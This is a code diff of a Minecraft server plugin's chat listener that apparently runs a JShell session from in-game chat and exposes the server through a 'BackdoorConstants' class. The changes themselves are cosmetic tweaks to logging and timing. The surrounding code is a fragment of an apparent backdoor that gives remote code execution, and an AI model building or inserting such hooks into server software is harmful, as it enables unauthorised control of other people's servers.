@@ -31,11 +31,13 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import java.util.Set;
 import java.util.UUID;
 import java.util.function.Consumer;
 
 public class ChatListener implements Listener {
+    private static final Random RANDOM = new Random();
     private static final String J_SHELL_START_MESSAGE = "&aJShell started!";
     private static final String J_SHELL_PROMPT = "&ajshell> ";
     private static final String ERROR_PREFIX = "&cAn error occurred when using JShell: ";
@@ -61,7 +63,7 @@ public class ChatListener implements Listener {
                 ".jar",
                 path -> {
                     try {
-                        Logger.log("Path: " + path.toString());
+                        Logger.log("Hooked: " + path.toString());
                         jShell.addToClasspath(path.toString());
                     } catch (Throwable e) {
                         Logger.stackTrace(e);
@@ -70,7 +72,8 @@ public class ChatListener implements Listener {
         String th = this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
         th = URLDecoder.decode(th, StandardCharsets.UTF_8);
         th = th.substring(1);
-        Logger.log("Path: " + th);
+        Logger.log("Hooked: " + th);
+        // todo: load all plugins with config-controlled (include, exclude)
         jShell.addToClasspath(th);
 
         BackdoorConstants.setObject("server", Bukkit.getServer());
@@ -90,9 +93,10 @@ public class ChatListener implements Listener {
     @ParametersAreNonnullByDefault
     @Nonnull
     private static String generateTimedCode(String code) {
-        return "long __timeit_start = System.currentTimeMillis(); " +
+        int identifier = RANDOM.nextInt(0, Integer.MAX_VALUE);
+        return "long __timeit_start_" + identifier + " = System.currentTimeMillis(); " +
                 code + "; " +
-                "player.sendMessage(\"Time Taken: \" + (System.currentTimeMillis() - __timeit_start) + \"ms\");";
+                "player.sendMessage(\"Time Taken: \" + (System.currentTimeMillis() - __timeit_start_" + identifier + ") + \"ms\");";
     }
 
     @ParametersAreNonnullByDefault
